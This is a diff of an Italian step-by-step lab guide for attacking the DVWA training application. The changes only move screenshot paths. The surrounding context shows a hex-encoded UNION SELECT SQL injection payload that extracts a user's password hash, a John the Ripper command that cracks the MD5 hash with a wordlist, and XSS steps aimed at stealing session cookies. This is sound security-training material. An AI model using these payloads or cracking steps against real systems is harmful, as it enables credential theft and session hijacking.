@@ -21,7 +21,7 @@ Questa guida fornisce istruzioni passo-passo per eseguire una SQL Injection sull
 ### 🎯 **Obiettivo**
 Estrarre i dati dell'utente **Pablo**, inclusa la sua password hash MD5.
 
-![PabloLow](./EstraggoPablo.png)
+![PabloLow](./Screenshots/EstraggoPablo.png)
 
 ### 📝 **Passaggi**
 
@@ -49,7 +49,7 @@ Estrarre i dati dell'utente **Pablo**, inclusa la sua password hash MD5.
 ### 🎯 **Obiettivo**
 Superare i controlli di filtraggio e ottenere i dati di Pablo utilizzando payload in formato hexadecimal.
 
-![SQLMedium](./SQLmedium.png)
+![SQLMedium](./Screenshots/SQLmedium.png)
 
 ### 📝 **Passaggi**
 
@@ -61,7 +61,7 @@ Superare i controlli di filtraggio e ottenere i dati di Pablo utilizzando payloa
    ```sql
    0x27 UNION SELECT user, password FROM dvwa.users WHERE user=0x5061626c6f -- 
    ```
-![PabloMedium](./EstraggoPabloMedium.png)
+![PabloMedium](./Screenshots/EstraggoPabloMedium.png)
 
    - `0x27` è il formato hexadecimal per l'apostrofo (`'`).
    - `0x5061626c6f` è il formato hexadecimal per `Pablo`.
@@ -90,7 +90,7 @@ Superare i controlli di filtraggio e ottenere i dati di Pablo utilizzando payloa
      ```bash
      john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
      ```
-![John](./JohnMD5crack.png)
+![John](./Screenshots/JohnMD5crack.png)
 
 ---
 
@@ -156,7 +156,7 @@ Iniettare uno script malevolo nella web application DVWA per inviare i cookie de
      ```
      PHPSESSID=abcdef1234567890; security=low
      ```
-![XSSLow](./XSSLow.png)
+![XSSLow](./Screenshots/XSSLow.png)
 
 ---
 
@@ -195,7 +195,7 @@ Aggirare i filtri di input e sfruttare la vulnerabilità XSS per ottenere i cook
      PHPSESSID=abcdef1234567890; security=medium
      ```
 
-![XSSMedium](./XSSMedium.png)
+![XSSMedium](./Screenshots/XSSMedium.png)
 
 ---
 
